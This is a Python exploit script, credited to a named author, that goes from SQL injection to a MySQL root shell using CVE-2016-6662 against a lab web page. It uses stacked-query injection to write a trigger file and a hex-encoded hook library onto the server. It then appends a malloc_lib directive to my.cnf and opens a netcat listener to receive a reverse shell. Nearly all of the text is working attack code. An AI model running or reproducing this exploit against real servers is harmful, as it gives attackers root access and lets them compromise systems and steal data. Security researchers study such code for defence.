import binascii, requests, subprocess, time, sys

# From SQL injection to root shell with CVE-2016-6662 by MaYaSeVeN
__author__ = 'Nop Phoomthaisong (http://mayaseven.com)'

target_db = "labs"
config_path = "/etc/mysql/my.cnf"
# where will the library to be preloaded reside? /tmp might get emptied on reboot
# /var/lib/mysql is safer option (and mysql can definitely write in there ;)
malloc_lib_path = '/var/lib/mysql/mysql_hookandroot_lib.so'

# How to clean the target system environment after trying to exploit.
# rm -f /var/lib/mysql/labs/poctable.TRG ; rm -f /var/lib/mysql/mysql_hookandroot_lib.so
# drop table tbl, tbl2, poctable;

def craft_payloads():
    payloads = []
    trigger_payload="""TYPE=TRIGGERS
triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'
sql_modes=0
definers='root@localhost'
client_cs_names='utf8'
connection_cl_names='utf8_general_ci'
db_cl_names='latin1_swedish_ci'
""" % (config_path, malloc_lib_path)

    # Convert trigger into HEX to pass it to unhex() SQL function
    trigger_payload_hex = "".join("{:02x}".format(ord(c)) for c in trigger_payload)
    # Save trigger into a trigger file
    trg_path = "/var/lib/mysql/%s/poctable.TRG" % target_db

    payloads.append(""";SELECT unhex('%s') INTO DUMPFILE '%s' ;""" % (trigger_payload_hex, trg_path))

    # info("Converting mysql_hookandroot_lib.so into HEX")
    hookandrootlib_path = './mysql_hookandroot_lib.so'
    with open(hookandrootlib_path, 'rb') as f:
        content = f.read()
    hookandrootlib_hex = binascii.hexlify(content)

    # print """SELECT unhex("%s") INTO DUMPFILE '%s' """ % (hookandrootlib_hex, malloc_lib_path)
    # Split hookandrootlib_hex by 900 length
    # payloads = map(''.join, zip(*[iter(hookandrootlib_hex)]*900)) #will lost the last member of list
    payload_parts = (hookandrootlib_hex[0+i:900+i] for i in range(0, len(hookandrootlib_hex), 900))
    payloads.append(";CREATE TABLE tbl (txt VARCHAR(1000));")
    for i in payload_parts:
        payloads.append(';INSERT INTO tbl VALUES ("' + i + '");')
    payloads.append(";CREATE TABLE tbl2 (txt VARCHAR(100000));")
    payloads.append(";SET GLOBAL group_concat_max_len=1000000;")
    payloads.append(";INSERT INTO tbl2 SELECT GROUP_CONCAT(txt SEPARATOR '') FROM tbl;")
    payloads.append(";SELECT unhex(txt) from tbl2 into dumpfile '" + malloc_lib_path + "';")
    # Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server
    payloads.append(";CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'")
    # Finally, execute the trigger's payload by inserting anything into `poctable`.
    # The payload will write to the mysql config file at this point.
    payloads.append(";INSERT INTO `poctable` VALUES('pwnd');")
    # Check on the config that was just created
    # payloads.append("SELECT load_file('%s')" % config_path)
    return payloads

base_url =  "http://192.168.77.101/labs/pokemon_pdo.php"
#base_url = sys.argv[1]
true_text = "dragonite"


def get_query(data):
    page_content = requests.get(base_url+data).text
    if true_text in page_content.lower():
        return True
    else:
        return False


def stacked_queries_check():
    times = list()
    for i in range(3):
        r = requests.get(base_url, params={'id': "1; SELECT SLEEP(5);"})
        times.append(r.elapsed.seconds)
    if (sum(times) / len(times)) == 5:
        return True
    else:
        return False

payloads = craft_payloads()
print "[*] From SQL injection to root shell with CVE-2016-6662 by MaYaSeVeN"
print "[*] Server ready for exploiting? : ", get_query("?id=1")
print "[*] SQL injection with stacked queries checking : ", stacked_queries_check()

switch = 1
for payload in payloads:
    if switch == 1:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Creating 1st payload file: ", result
        else:
            print "[*] Creating 1st payload file: ", result
            break
    elif switch == 2:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Prepare environment for injecting payload: ", result
        else:
            print "[*] Prepare environment for injecting payload: ", result
            break
    elif switch >= 3 and switch <= 24:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Trying to inject payload " + str(switch - 2) + "/22: ", result
        else:
            print "[*] Trying to inject payload " + str(switch - 2) + "/22: ", result
            break
    elif switch == 25:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Prepare some space for 2nd payload: ", result
        else:
            print "[*] Prepare some space for 2nd payload: ", result
            break
    elif switch == 26:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Prepare environment for executing payloads: ", result
        else:
            print "[*] Prepare environment for executing payloads: ", result
            break
    elif switch == 27:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Inserting parts of 2nd payload: ", result
        else:
            print "[*] Inserting parts of 2nd payload: ", result
            break
    elif switch == 28:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Crating 2nd payload file: ", result
        else:
            print "[*] Crating 2nd payload file: ", result
            break
    elif switch == 29:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Trying to exploit the MySQL Server: ", result
        else:
            print "[*] Trying to exploit the MySQL Server: ", result
            break
    elif switch == 30:
        result = get_query('?id=1' + payload)
        if result:
            print "[*] Exploited: ", result
        else:
            print "[*] Exploited: ", result
            break
    switch += 1
    time.sleep(0.2)
print "[*] Waiting for reverse shell ;)"
listener = subprocess.Popen(args=["nc", "-l", "7777"])
listener.communicate()
